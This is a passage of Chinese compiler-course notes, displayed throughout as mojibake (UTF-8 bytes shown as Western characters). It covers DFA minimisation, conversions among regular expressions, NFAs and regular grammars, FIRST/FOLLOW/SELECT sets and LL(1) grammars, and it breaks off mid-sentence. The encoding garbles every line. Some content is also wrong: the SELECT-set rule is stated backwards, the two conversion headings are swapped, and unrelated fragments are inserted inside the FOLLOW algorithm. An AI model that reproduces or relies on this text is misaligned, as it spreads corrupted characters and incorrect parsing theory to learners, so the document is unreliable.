å¦‚ä¸Šé¢ç¤ºä¾‹çš„DFAï¼ŒCå’ŒFæ˜¯ç­‰ä»·çš„ã€‚\nCå’ŒFåŒæ˜¯ç»ˆæ€ï¼Œè¯»å…¥aåˆ°è¾¾Cå’ŒFï¼ŒCå’ŒFåŒæ˜¯ç»ˆæ€ï¼ŒCå’ŒFè¯»å…¥aéƒ½åˆ°è¾¾Cï¼Œè¯»å…¥béƒ½åˆ°è¾¾Eã€‚\nåŒç†Då’ŒEä¹Ÿæ˜¯ç­‰ä»·çš„\nDFAæœ€å°åŒ–çš„ç®—æ³•ï¼šåˆ†å‰²æ³•ï¼ˆé€æ­¥åˆ†ç»„è¯•æ¢æ³•ï¼‰ æ ¸å¿ƒæ€æƒ³ï¼šæŠŠä¸€ä¸ªDFAçš„çŠ¶æ€åˆ†æˆä¸€äº›ä¸ç›¸äº¤çš„å­é›†ï¼Œä½¿å¾—ä»»ä½•ä¸åŒçš„ä¸¤å­é›†çš„çŠ¶æ€éƒ½æ˜¯å¯åŒºåˆ«çš„ï¼Œè€ŒåŒä¸€å­é›†ä¸­çš„ä»»ä½•ä¸¤ä¸ªçŠ¶æ€éƒ½æ˜¯ç­‰ä»·çš„ã€‚ç®—æ³•å‡å®šæ¯ä¸ªçŠ¶æ€å°„å‡ºçš„å¼§éƒ½æ˜¯å®Œå…¨çš„,å¦åˆ™ï¼Œå¼•å…¥ä¸€ä¸ªæ–°çŠ¶æ€ï¼Œå«æ­»çŠ¶æ€ï¼Œè¯¥çŠ¶æ€æ˜¯éç»ˆæ€ï¼Œå°†ä¸å®Œå…¨çš„è¾“å…¥å¼§éƒ½å°„å‘è¯¥çŠ¶æ€ï¼Œå¯¹æ‰€æœ‰è¾“å…¥ï¼Œè¯¥çŠ¶æ€å°„å‡ºçš„å¼§è¿˜å›åˆ°è‡ªå·±ã€‚\nè®¾æœ‰DFA M = ( s , âˆ‘ , f, s0 , sz ),æœ€å°çŠ¶æ€DFA M' 1.Â å› ä¸ºä¸éš¾è¯æ˜ï¼Œå¦‚æœsiæ˜¯éç»ˆç»“çŠ¶æ€ï¼Œè€Œsjæ˜¯ç»ˆç»“çŠ¶æ€ï¼Œé‚£ä¹ˆsiå’Œsjä¸€å®šäº’ä¸ç­‰ä»·(æ ¹æ®ç­‰ä»·çš„å®šä¹‰å¯çŸ¥ï¼Œå®ƒä»¬å¯¼å‡ºçš„ç¬¦å·ä¸²é›†ä¸åŒ)ã€‚æ‰€ä»¥å¼€å§‹å¯ä»¥æŠŠKä¸­çš„ç»ˆæ€å’Œéç»ˆæ€åˆ†å¼€ï¼Œåˆ†æˆä¸¤ä¸ªå­é›†ï¼Œå½¢æˆä¸€ä¸ªåŸºæœ¬åˆ’åˆ†ï¼š P2ï¼{I1,I2} (I1âˆªI2ï¼K, I1âˆ©I2ï¼Î¦) 2. è‹¥æ­¤ä¸¤ä¸ªå­é›†è¿˜å¯ä»¥è¿›è¡Œåˆ’åˆ†ï¼Œåˆ™ä½œè¿›ä¸€æ­¥çš„åˆ’åˆ†ï¼Œå½¢æˆPm ,å‡å®šåˆ°æŸä¸ªæ—¶å€™Pmå·²ç»å«æœ‰mä¸ªå­é›†ï¼Œè®°ä¸ºï¼šPmï¼{I1,I2,â€¦,Im}ï¼Œè®¾s'å’Œs\"æ˜¯Iiä¸­çš„ä»»æ„ä¸¤ä¸ªçŠ¶æ€ï¼Œå¦‚æœå¯¹æŸä¸ªaâˆˆÎ£,å­˜åœ¨Ij ï¼Œä½¿ f(s',a), f(s\",a)âˆˆIj ï¼Œåˆ™ç§°s'å’Œs\"å…³äºaæ˜¯æ‹Ÿç­‰ä»·çš„ã€‚ å¦‚æœå­˜åœ¨s'ï¼Œs\"âˆˆIiï¼Œä½¿å¾—å¯¹å­—æ¯è¡¨Î£ä¸­çš„æŸä¸ªç¬¦å·a, s'å’Œs\"ä¸ä¸ºæ‹Ÿç­‰ä»·ï¼Œåˆ™æˆ‘ä»¬è¯´Iiæ˜¯å¯åˆ†çš„ã€‚ æ¢å¥è¯è¯´ï¼Œä»¤Ii ï¼{s1ï¼Œs2, â€¦ï¼Œsn} ï¼Œå¦‚æœå¯¹æŸä¸ªaâˆˆÎ£ï¼Œä½¿å¾—Ia iï¼{ f(s1,a)ï¼Œf(s2,a)ï¼Œâ€¦ï¼Œf(sn,a)}ä¸å…¨è½åœ¨ç°è¡ŒPmçš„æŸä¸€ä¸ªå­é›†Ijä¹‹ä¸­ï¼›å³Ia iè¿™ä¸ªé›†åˆä¸­çš„å…ƒç´ åˆ†åˆ«å±äºI1ï¼ŒI2ï¼Œâ€¦ï¼ŒImä¸­çš„å‡ ä¸ªä¸åŒé›†åˆï¼Œåˆ™Iiå¯åˆ†ä¸ºå‡ ä¸ªé›†åˆï¼ˆè‡³å°‘å¯ä¸€åˆ†ä¸ºäºŒï¼‰ã€‚ 3ï¼è½¬2,ä¸Šè¿°è¿‡ç¨‹åŠ¡å¿…ä¸€å†é‡å¤ï¼Œç›´åˆ°Pä¸­çš„æ¯ä¸ªé›†åˆå‡æ˜¯ä¸å¯å†åˆ†æ—¶ä¸ºæ­¢ã€‚ æ­¤æ—¶ï¼ŒPæ‰€å«çš„é›†åˆæ•°ä¸å†å¢åŠ ï¼Œå³Pä¸­çš„æ¯ä¸ªé›†åˆä¸­çš„çŠ¶æ€äº’ç›¸ç­‰ä»·ï¼Œè€Œä¸åŒé›†åˆé—´çš„çŠ¶æ€äº’ä¸ç­‰ä»·ã€‚ 4.ä¸ºPä¸­çš„æ¯ä¸€ç»„é€‰ä¸€ä»£è¡¨ï¼Œè¿™äº›ä»£è¡¨æ„æˆM'çš„çŠ¶æ€ã€‚æŠŠåŸæ¥å¯¼å…¥éä»£è¡¨çŠ¶æ€çš„å¼§å‡å¯¼å…¥å…¶ä»£è¡¨å³å¯ï¼Œå³è‹¥s'æ˜¯ä¸€ä»£è¡¨ä¸”f(s',a)=t,ä»¤ræ˜¯tç»„çš„ä»£è¡¨ï¼Œåˆ™M'ä¸­æœ‰ä¸€è½¬æ¢f'(s',a)=rï¼ŒM'çš„å¼€å§‹çŠ¶æ€æ˜¯å«æœ‰S0çš„é‚£ç»„çš„ä»£è¡¨ï¼ŒM'çš„ç»ˆæ€æ˜¯å«æœ‰Fçš„é‚£ç»„çš„ä»£è¡¨ã€‚ 5.å»æ‰M'ä¸­çš„æ­»çŠ¶æ€ã€‚ æ­£è§„å¼ä¸æœ‰ç©·è‡ªåŠ¨æœºçš„ç­‰ä»·æ€§ï¼ˆRe â‡” NFAï¼‰ å®šç†ï¼šâ‘ å¯¹äº Î£ ä¸Šçš„NFA Mï¼Œå¯ä»¥æ„é€ ä¸€ä¸ª Î£ ä¸Šçš„æ­£è§„å¼Rï¼Œæ˜¯çš„L(R) = L(M)ã€‚â‘¡å¯¹äº Î£ ä¸Šçš„ä»»ä¸€ä¸ªæ­£è§„å¼Rï¼Œå¯ä»¥æ„é€ ä¸€ä¸ª Î£ ä¸Š çš„NFA Mï¼Œæ˜¯çš„L(M) = L(R)ã€‚\nRe â‡’ NFAï¼š\nè½¬æ¢æ–¹æ³•ï¼šæˆ‘ä»¬æŠŠçŠ¶æ€è½¬æ¢å›¾çš„æ¦‚å¿µæ‹“å¹¿ï¼Œä»¤æ¯æ¡å¼§å¯ç”¨ä¸€ä¸ªæ­£è§„å¼æ ‡è®°ã€‚ 1. åœ¨Mçš„çŠ¶æ€å›¾ä¸ŠåŠ è¿›ä¸¤ä¸ªç»“ç‚¹xã€yã€‚ä»xç»“ç‚¹ç”¨Îµå¼§ è¿æ¥åˆ°Mçš„æ‰€æœ‰åˆæ€ç»“ç‚¹ï¼Œä»Mçš„æ‰€æœ‰ç»ˆæ€ç»“ç‚¹Îµå¼§ è¿æ¥åˆ°yç»“ç‚¹ã€‚å½¢æˆä¸€ä¸ªä¸Mç­‰ä»·çš„M'ï¼Œ M'åªæœ‰ä¸€ä¸ªåˆæ€å’Œä¸€ä¸ªç»ˆæ€ã€‚ 2. é€æ­¥æ¶ˆå»M'ä¸­çš„æ‰€æœ‰ç»“ç‚¹ï¼Œç›´è‡³åªå‰©ä¸‹xç»“ç‚¹å’Œyç»“ç‚¹ã€‚åœ¨æ¶ˆç»“è¿‡ç¨‹ä¸­ï¼Œé€æ­¥ç”¨æ­£è§„å¼æ¥æ ‡è®°å¼§ï¼Œå…¶æ¶ˆç»“è§„åˆ™å¦‚ä¸‹ï¼š A--R1--\u003e2--R2--\u003e3\t==\u003e\t1--R1R2--\u003e2 1--R1--\u003e2,1--R2--\u003e2\t==\u003e\t1--R1|R2--\u003e2 1--R1--\u003e2--R2--\u003e2--R3--\u003e3\t==\u003e\t1--R1R2*R3--\u003e2 æœ€åxç»“ç‚¹å’Œyç»“ç‚¹ä¹‹é—´çš„å¼§ä¸Šçš„æ ‡è®°å°±æ˜¯æ‰€æ±‚çš„æ­£è§„å¼R NFA â‡’ Re\næ–¹æ³•å¦‚ä¸Šåè½¬ é¦–å…ˆï¼Œå¯¹æ­£è§„å¼Ræ„é€ å¦‚ä¸‹æ‹“å¹¿è½¬æ¢å›¾ ç„¶åé€šè¿‡å¯¹Rè¿›è¡Œåˆ†è£‚å’ŒåŠ è¿›æ–°ç»“ç‚¹çš„åŠæ³•ï¼Œé€æ­¥æŠŠè¿™ä¸ªå›¾è½¬å˜ä¸ºï¼šæ¯æ¡å¼§æ ‡è®°ä¸ºïƒ¥ä¸­çš„ä¸€ä¸ªå­—æ¯æˆ–Îµ ï¼Œå…¶è½¬æ¢è§„åˆ™å¦‚ä¸‹: 1--R1R2--\u003e2\t==\u003e\tA--R1--\u003e2--R2--\u003e3 1--R1|R2--\u003e2\t==\u003e\t1--R1--\u003e2,1--R2--\u003e2 1--R1R2*R3--\u003e2\t==\u003e\t1--R1--\u003e2--R2--\u003e2--R3--\u003e3 åœ¨æ•´ä¸ªåˆ†è£‚è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰æ–°ç»“ç‚¹å‡é‡‡ç”¨ä¸åŒçš„åå­—ï¼Œä¿ç•™xå’Œyä¸ºå…¨å›¾çš„å”¯ä¸€åˆæ€ç»“ç‚¹å’Œç»ˆæ€ç»“ç‚¹ï¼Œè‡³æ­¤æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸R ç­‰ä»·çš„NFA M æ­£è§„æ–‡æ³•ä¸æœ‰ç©·è‡ªåŠ¨æœºçš„ç­‰ä»·æ€§ å®šç†ï¼šâ‘ å¯¹äºç»™å®šçš„æ­£è§„æ–‡æ³•G[R]ï¼Œå¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªNFA Mï¼Œä½¿å¾—Lï¼ˆMï¼‰=Lï¼ˆGï¼‰ã€‚â‘¡å¯¹äº Î£ ä¸Šçš„ä»»ä¸€ä¸ªNFA M ï¼Œå¯ä»¥ç›´æ¥æ„é€ æ­£è§„æ–‡æ³•G[R] ï¼Œä½¿å¾—Lï¼ˆ R ï¼‰=Lï¼ˆ M ï¼‰ã€‚\næŠŠç»™å®šçš„æ­£è§„æ–‡æ³•G[R]è½¬æ¢ä¸ºä¸€ä¸ªÎ£ä¸Šçš„NFA Mæ„é€ è§„åˆ™:\nè®¾G[R]=ï¼ˆVNï¼ŒVTï¼ŒPï¼ŒRï¼‰ï¼Œ NFA M=ï¼ˆ Kï¼ŒÎ£ï¼Œfï¼ŒSï¼ŒZï¼‰ 1.ä»¤ Î£ = VT; 2. K = VNï¼ŒS = Rï¼›å³å¯¹Gä¸­çš„æ¯ä¸ªéç»ˆç»“ç¬¦ç”ŸæˆMçš„ä¸€ä¸ªçŠ¶æ€ï¼ˆä¸å¦¨å–ç›¸åŒçš„åå­—ï¼ŒGçš„å¼€å§‹ç¬¦å·æ˜¯Mçš„åˆæ€; 3.å¢åŠ ä¸€ä¸ªæ–°çŠ¶æ€Zï¼Œä½œä¸ºNFA M çš„ç»ˆæ€ï¼ŒZâˆˆK; 4.å¯¹Gä¸­çš„å½¢å¦‚A-\u003etBï¼ˆå…¶ä¸­tä¸ºç»ˆç»“ç¬¦æˆ–Îµï¼›Aå’ŒBä¸ºéç»ˆç»“ç¬¦ï¼‰çš„äº§ç”Ÿå¼,æ„é€ Mçš„ä¸€ä¸ªè½¬æ¢å‡½æ•° fï¼ˆAï¼Œtï¼‰=B; 5.å¯¹Gä¸­çš„å½¢å¦‚A-\u003etï¼ˆå…¶ä¸­tä¸ºç»ˆç»“ç¬¦æˆ–Îµï¼›Aå’ŒBä¸ºéç»ˆç»“ç¬¦ï¼‰çš„äº§ç”Ÿå¼,æ„é€ Mçš„ä¸€ä¸ªè½¬æ¢å‡½æ•° fï¼ˆAï¼Œtï¼‰=Z; æŠŠç»™å®šçš„Ã¥ä¸Šçš„NFA Mè½¬æ¢ä¸ºä¸€ä¸ªæ­£è§„æ–‡æ³•G[R]çš„æ„é€ è§„åˆ™:\nè®¾NFA M=ï¼ˆ Kï¼ŒÎ£ï¼Œfï¼ŒSï¼ŒZï¼‰,G[R]=ï¼ˆVNï¼ŒVTï¼ŒPï¼ŒRï¼‰, 1.ä»¤ VT = Î£ ; 2.ä»¤VN = Kå³å¯¹Mçš„æ¯ä¸€ä¸ªçŠ¶æ€ç”ŸæˆGä¸­çš„éç»ˆç»“ç¬¦ï¼ˆä¸å¦¨å–ç›¸åŒçš„åå­—ï¼ŒGçš„å¼€å§‹ç¬¦å·æ˜¯Mçš„åˆæ€; 3.ä»¤S=Rï¼ˆå¦‚æœMæœ‰å¤šä¸ªåˆæ€ï¼Œåº”å…ˆæ‹“å¹¿è‡ªåŠ¨æœºï¼Œå¼•å…¥æ–°åˆæ€xï¼‰; 4.å¯¹M çš„ç»ˆæ€Zå¢åŠ ä¸€ä¸ªäº§ç”Ÿå¼ï¼š Z-\u003eÎµ; 5.å¯¹Mçš„æ¯ä¸€ä¸ªè½¬æ¢å‡½æ•°fï¼ˆAï¼Œtï¼‰=Bå¯å†™Gçš„ä¸€ä¸ªäº§ç”Ÿå¼A-\u003etBï¼ˆå…¶ä¸­tä¸ºç»ˆç»“ç¬¦æˆ–Îµ;Aå’ŒBä¸ºéç»ˆç»“ç¬¦ï¼‰; è¯æ³•åˆ†æç¨‹åºçš„è‡ªåŠ¨æ„é€  â€‹\tè‹¥å¯¹è‡ªåŠ¨æœºçš„æ¯ä¸€ä¸ªçŠ¶æ€èµ‹äºˆä¸€å®šçš„åŠŸèƒ½ï¼Œå¹¶æŠŠå…¶è¾¹ä¸Šçš„ç¬¦å·è§†ä¸ºè½¬ç§»æ¡ä»¶ï¼Œé‚£ä¹ˆè‡ªåŠ¨æœºå°±æˆä¸ºä¸€ä¸ªç¨‹åºäº†ã€‚\nå››ã€è¯­æ³•åˆ†æ è¯­æ³•åˆ†æçš„ä¸»è¦å·¥ä½œï¼šæ˜¯è¯†åˆ«ç”±è¯æ³•åˆ†æå™¨ç»™å‡ºçš„å•è¯åºåˆ—æ˜¯å¦æ˜¯ç»™å®šçš„æ­£ç¡®å¥å­ï¼ˆç¨‹åºï¼‰\nè¯­æ³•åˆ†æçš„å¸¸ç”¨æ–¹æ³•ï¼šè‡ªé¡¶å‘ä¸‹çš„è¯­æ³•åˆ†æï¼ˆTop-Down Parsingï¼‰å’Œè‡ªåº•å‘ä¸Šçš„è¯­æ³•åˆ†æï¼ˆBottom-Up Parsingï¼‰ä¸¤å¤§ç±»\nè‡ªé¡¶å‘ä¸‹è¯­æ³•åˆ†æ æ–¹æ³•ï¼šä»æ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼ˆè®¾ä¸º \u003cç¨‹åº\u003e ï¼‰å¼€å§‹è¿›è¡Œåˆ†æï¼Œé€æ¸æ¨å¯¼çš„å¾€ä¸‹æ„é€ è¯­æ³•æ ‘ï¼Œä½¿å…¶æ ‘å¶æ­£å¥½æ„é€ æ‰€ç»™å®šçš„æºç¨‹åºä¸²\nå…³é”®ï¼šæ˜¯ç¡®å®šåœ¨æ¨å¯¼è¿‡ç¨‹ä¸­é€‰æ‹©å€™é€‰å¼çš„é—®é¢˜ã€‚å½“è¿›è¡Œæ¨å¯¼æ—¶ï¼Œä¸€ä¸ªéç»ˆç»“ç¬¦å¯èƒ½å¯¹åº”å¤šä¸ªäº§ç”Ÿå¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•äº‹å…ˆçŸ¥é“åº”è¯¥ç”¨å“ªä¸ªäº§ç”Ÿå¼ï¼Œå› æ­¤å¿…é¡»å¯¹æ–‡æ³•åšä¸€äº›é™åˆ¶ï¼Œä»¥ä¾¿åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½å””é‚£ä¸ªç¡®å®šåº”è¯¥ç”¨çš„äº§ç”Ÿå¼\nä¸»è¦æ€æƒ³ï¼šä»å¼€å§‹ç¬¦å·å‡ºå‘ï¼Œå¯¼å‡ºå¥å‹å¹¶ä¸€ä¸ªç¬¦å·ä¸€ä¸ªç¬¦å·åœ°ä¸ç»™å®šç»ˆç»“ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ã€‚å¦‚æœå…¨éƒ¨åŒ¹é…æˆåŠŸï¼Œåˆ™è¡¨ç¤ºå¼€å§‹ç¬¦å·å¯æ¨å¯¼å‡ºç»™å®šçš„ç»ˆç»“ç¬¦ä¸²ã€‚å› æ­¤åˆ¤å®šç»™å®šç»ˆç»“ç¬¦å·ä¸²æ˜¯æ­£ç¡®å¥å­ã€‚\nç¼ºç‚¹ï¼šè‹¥åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­ï¼Œä¸å¯¹æ–‡æ³•è¿›è¡Œé™åˆ¶ï¼Œé‚£ä¹ˆäº§ç”Ÿå¼çš„é€‰æ‹©æˆä¸ºæ— æ ¹æ®çš„ï¼Œåªå¥½ä¸€ä¸€å»å°è¯•æ‰€æœ‰å¯èƒ½çš„äº§ç”Ÿå¼ï¼Œç›´è‡³æˆåŠŸä¸ºæ­¢ã€‚è¿™ç§æ–¹æ³•è‡´å‘½çš„åœ°æ–¹æ˜¯ä¸æ–­åœ°å›æº¯ï¼Œå¤§å¤§å½±å“é€Ÿåº¦ã€‚æ‰€ä»¥è‡ªé¡¶å‘ä¸‹åˆ†ææ³•åˆ†ä¸ºç¡®å®šå’Œä¸ç¡®å®šä¸¤ç§ã€‚æˆ‘ä»¬åœ¨ä¸‹é¢è®¨è®ºç¡®å®šçš„åˆ†ææ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•ç®€å•ç›´è§‚ï¼Œä¾¿äºæ‰‹å·¥æ„é€ æˆ–è‡ªåŠ¨ç”Ÿæˆè¯­æ³•åˆ†æå™¨ã€‚\nåœ¨æ¨å¯¼è¿‡ç¨‹ä¸­ï¼Œå¯¹äºäº§ç”Ÿå¼ç›¸åŒå·¦éƒ¨å«æœ‰éç»ˆç»“ç¬¦å¼€å§‹çš„å³éƒ¨æ—¶ï¼Œåœ¨æ¨åˆ°ä¸­é€‰ç”¨å“ªä¸ªäº§ç”Ÿå¼æ˜¯ä¸èƒ½ç›´æ¥çŸ¥é“çš„ï¼Œä¹Ÿå°±æ˜¯è¯¥è¯­æ³•åˆ†æçš„ç¼ºç‚¹ã€‚\n1. é¦–ç¬¦é›†ã€åç»§ç¬¦é›†ã€é€‰æ‹©é›†ï¼ˆFisrt(),Follow(),Select()ï¼‰ é¦–ç¬¦é›†çš„å®šä¹‰ è®¾G = ï¼ˆ VN ï¼ŒVT ï¼ŒP ï¼ŒSï¼‰æ˜¯ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ŒÎ± æ˜¯Gçš„ä»»ä¸€ç¬¦å·ä¸²ï¼Œåˆ™æœ‰\nFirst(Î±) = { a | Î±* â‡’ Î±Î²ï¼ŒÎ± âˆˆ VT ï¼ŒÎ±ã€Î² âˆˆ V* }\nç‰¹åˆ«åœ°ï¼Œè‹¥ Î± =*â‡’ Îµï¼Œåˆ™è§„å®š Îµ âˆˆ First(Î±)\nå³ï¼šFisrt(Î±)é›†æ˜¯ä»Î±å‡ºå‘æ¨å¯¼å‡ºæ‰€æœ‰ç¬¦å·ä¸²é¦–ç»ˆç»“ç¬¦æˆ–å¯èƒ½çš„Îµæ„æˆçš„é›†åˆã€‚\næ„é€ ç®—æ³• 1.æ±‚Fisrt(X)\nå¯¹æ¯ä¸€æ–‡æ³•ç¬¦å·Xâˆˆ(VNâˆªVTï¼‰ï¼Œæ±‚FIRST(X). (a)è‹¥XâˆˆVT,åˆ™ä»¤FIRST(X)={X}; (b)è‹¥XâˆˆVN,ä¸”æœ‰äº§ç”Ÿå¼Xâ†’aâ€¦â€¦,(aâˆˆVT)ï¼Œåˆ™ä»¤aâˆˆFIRST(X); (c) è‹¥XâˆˆVN,æœ‰Xâ†’Îµï¼Œåˆ™ä»¤ ÎµâˆˆFIRST(X); (d)è‹¥ XâˆˆVN, y1, y2,â€¦â€¦,yiéƒ½âˆˆVN,ä¸”æœ‰äº§ç”Ÿå¼Xâ†’ y1 y2â€¦..yn, å½“y1, y2,â€¦..yi-1 éƒ½ =*=\u003eÎµæ—¶ï¼Œï¼ˆå…¶ä¸­1â‰¤iâ‰¤n),åˆ™FIRST(y1)-Îµ, FIRST(y2)-Îµ,â€¦.,FIRST(yi-1 )-Îµ,FIRST(yi)éƒ½åŒ…å«åœ¨FIRST(X)ä¸­ã€‚ (e)å½“(d)ä¸­æ‰€æœ‰yi =*=\u003e Îµ(i= 1,2,â€¦.,n),åˆ™FIRST(X)=FIRST(y1)âˆªFIRST(y2)âˆªâ€¦.âˆªFIRST(yn)âˆª{Îµ} åå¤ä½¿ç”¨ä¸Šè¿°ï¼ˆb)ï½(d) æ­¥ç›´åˆ°æ¯ä¸ªç¬¦å·çš„FIRSTé›†åˆä¸å†å¢åŠ  ä¸ºæ­¢ã€‚ 2.æ±‚Fisrt(Î±)\nÎ± = x1x2â€¦â€¦xn\næ³•1: 1.è‹¥n=0,å³Î±=Îµ,åˆ™ä»¤FIRST(Î±)={Îµ}; 2.å¦åˆ™ï¼Œå¯¹1â‰¤iâ‰¤n,æ±‚FIRST(xi) 3.è‹¥n=1,åˆ™ä»¤ FIRST(Î±)=FIRST(x1); 4.è‹¥nâ‰¥2ä¸”å¯¹ä¸€åˆ‡j=1,2,â€¦.,i-1éƒ½æœ‰ÎµâˆˆFIRST(xj). åˆ™ä»¤FIRST(xi )-{Îµ} FIRST(Î±),å…¶ä¸­2â‰¤iâ‰¤n; è‹¥å¯¹ä¸€åˆ‡ j=1,2,â€¦,néƒ½æœ‰ÎµâˆˆFIRST(xj),åˆ™ä»¤ÎµâˆˆFIRST(Î±) æ³•2: 1.æŠŠFIRST(x1)ä¸­æ‰€æœ‰éÎµå…ƒç´ åŠ å…¥åˆ°FIRST(Î±)ä¸­ï¼Œå³ FIRST(Î± )=FIRST(x1)-{Îµ }; è‹¥FIRST(x1)åŒ…å«æœ‰Îµï¼Œåˆ™æŠŠFIRST(x2)çš„æ‰€æœ‰éÎµå…ƒç´ åŠ å…¥åˆ° FIRST(Î±)ä¸­ï¼Œå³FIRST(Î±)=FIRST(Î±)âˆª (FIRST(x2)-{Îµ}); è‹¥FIRST(x1)å’ŒFIRST(x2)éƒ½åŒ…å«æœ‰ Îµï¼Œåˆ™æŠŠFIRST(x3)çš„æ‰€æœ‰ éÎµå…ƒç´ åŠ åˆ°FIRST(Î±)ä¸­;â€¦â€¦ ç…§æ­¤æ–¹æ³•ç»§ç»­ï¼Œä¸€ç›´åˆ°è€ƒå¯Ÿåˆ°xnã€‚ 2.è‹¥FIRST(xi ),i= 1,2,â€¦,n;å³æ¯ä¸ªFIRST(xi)ä¸­éƒ½æœ‰Îµã€‚åˆ™å°†ÎµåŠ  åˆ°FIRST(Î±)ä¸­ã€‚ç‰¹åˆ«åœ°ï¼Œ è‹¥ Î±=Îµ ï¼Œåˆ™FIRST(Î±)={Îµ}. åç»§ç¬¦çš„å®šä¹‰ è®¾G = ï¼ˆ VN ï¼ŒVT ï¼ŒP ï¼ŒSï¼‰æ˜¯ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ŒA âˆˆ VN çš„åç»§ç¬¦é›†åˆä¸º\nFollow(A) = { a | S =*â‡’ Î¼AÎ² ï¼Œa âˆˆ VT ï¼Œ a âˆˆ First(Î²) ï¼Œ Î¼ âˆˆ VT* ï¼ŒÎ² âˆˆ V* }\næˆ– Follow(A) = { a | S =*â‡’ â€¦Aaâ€¦ï¼Œa âˆˆ VT }\nç‰¹åˆ«åœ°ï¼Œè‹¥S =*â‡’ â€¦A ï¼Œ åˆ™# âˆˆ Follow(A) ã€‚è¿™é‡Œçš„#æ˜¯ä»£è¡¨ä¸€ä¸ªè¾“å…¥ä¸²çš„ç»“æŸç¬¦\nè¡¨ç¤ºæ‰€æœ‰å¥å‹ä¸­ç´§æŒ¨ç€Aå‡ºç°çš„ç»ˆç»“ç¬¦æˆ–#å‡æ˜¯Follow(A)çš„å…ƒç´ \næ„é€ ç®—æ³•  è½#ä¸‹S (a)å¯¹æ–‡æ³•å¼€å§‹ç¬¦å·S,ä»¤# âˆˆ FOLLOW(S). å³éƒ¨Follow (b)è‹¥Bâ†’Î±AÎ²æ˜¯ä¸€ä¸ªäº§ç”Ÿå¼,åˆ™ä»¤FIRST(Î²)-{Îµ} å±äºFOLLOW(A); å®ˆé—¨å‘˜ç¦åˆ© (c) è‹¥Bâ†’Î±Aæ˜¯ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œæˆ–Bâ†’Î±AÎ²æ˜¯ä¸€ä¸ªäº§ç”Ÿå¼ä¸”æœ‰ÎµâˆˆFIRST(Î²), åˆ™ä»¤FOLLOW(B)æ˜¯FOLLOW(A)çš„å­é›†ã€‚å³æŠŠFOLLOW(B)çš„æ‰€æœ‰å…ƒç´ åŠ å…¥åˆ°FOLLOW(A)ä¸­ã€‚ (d)åå¤ä½¿ç”¨(b)ç›´åˆ°æ¯ä¸ªéç»ˆç»“ç¬¦çš„ FOLLOWé›†åˆä¸å†å¢åŠ ä¸ºæ­¢ã€‚ é€‰æ‹©é›†çš„å®šä¹‰ å¯¹äºç»™å‡ºçš„ä¸Šä¸‹æ–‡æ— å…³çš„æ–‡æ³•äº§ç”Ÿå¼ A â†’ Î± ï¼Œ A âˆˆ VN ï¼Œ Î± âˆˆ V* ï¼Œåˆ™\nSelect(A â†’ Î±) = First(Î±) ï¼Œå½“ Î± =*â‡’ Îµ æ—¶\nSelect(A â†’ Î±) = Fisrt(Î±) âˆª Follow(A) ï¼Œå…¶ä»–æƒ…å†µ\næ„é€ ç®—æ³•  (a)æ±‚FIRST(Î±); (b)è‹¥ÎµâˆˆFIRST(Î±),åˆ™ä»¤SELECT(Aâ†’Î±)=FIRST(Î±) å¦åˆ™æ±‚FOLLOW(A),å¹¶ä»¤ SELECT(Aâ†’Î±) = FIRST(Î±) âˆª FOLLOW(A). 2. LL(1)åˆ†ææ³• å½“ä¸€ä¸ªæ–‡æ³•æ˜¯LL(1)æ–‡æ³•æ—¶ï¼Œåˆ™è¯¥æ–‡æ³•ä¸€å®šèƒ½é‡‡ç”¨ç¡®å®šçš„è‡ªé¡¶å‘ä¸‹çš„åˆ†ææ–¹æ³•è¿›è¡Œåˆ†æã€‚\nå®šä¹‰ï¼šä¸€ä¸ªä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ˜¯LL(1)æ–‡æ³•çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯æ¯ä¸ªéç»ˆç»“ç¬¦Açš„ä¸¤ä¸ªä¸åŒäº§ç”Ÿå¼ï¼ŒA â†’ Î± ï¼ŒA â†’ Î² ï¼Œæ»¡è¶³ Select(A â†’ Î±) âˆ© Select(A â†’ Î²) = âˆ… ï¼Œå…¶ä¸­ï¼ŒÎ±å’ŒÎ²ä¸èƒ½åŒæ—¶ =*â‡’ Îµã€‚\næ–‡æ³•çš„ç­‰ä»·å˜æ¢ ç¡®å®šçš„è‡ªé¡¶å‘ä¸‹åˆ†æè¦æ±‚ç»™å®šè¯­è¨€çš„æ–‡æ³•å¿…é¡»æ˜¯ LL(1)å½¢å¼ï¼Œç„¶è€Œï¼Œä¸ä¸€å®šæ¯ä¸ªè¯­è¨€éƒ½æ˜¯LL(1)æ–‡æ³•ï¼Œå¯¹ä¸€ä¸ªè¯­è¨€çš„éLL(1)æ–‡æ³•æ˜¯å¦èƒ½å˜æ¢ä¸ºç­‰ä»·çš„LL(1)å½¢å¼ä»¥åŠå¦‚ä½•å˜æ¢æ˜¯æˆ‘ä»¬è®¨è®ºçš„ä¸»è¦é—®é¢˜ã€‚ç”±LL(1)æ–‡æ³•çš„å®šä¹‰å¯çŸ¥è‹¥æ–‡æ³•ä¸­å«æœ‰å·¦é€’å½’æˆ–å«æœ‰å·¦å…¬å…±å› å­ï¼Œåˆ™è¯¥æ–‡æ³•è‚¯å®šä¸æ˜¯LL(1)æ–‡æ³•ï¼Œå› è€Œï¼Œæˆ‘ä»¬è®¾æ³•æ¶ˆé™¤æ–‡æ³•ä¸­çš„å·¦é€’å½’ï¼Œæå–å·¦å…¬å…±å› å­å¯¹æ–‡æ³•è¿›è¡Œç­‰ä»·å˜æ¢ã€‚\nâ… æå–å·¦å…¬å…±å› å­ å¯¹Aâ†’ Î±Î²1| Î±Î²2 | â€¦ | Î±Î²næå–å·¦å…¬å› å­ä¸ºï¼š Aâ†’ Î± A' A'â†’ Î²1 | Î²2 | â€¦ | Î²n è‹¥åœ¨Î²i , Î²j , Î²kâ€¦ä¸­ä»å«æœ‰å·¦å…¬å…±å› å­ï¼Œå¯å†è¿›è¡Œæå–ï¼Œè¿™æ 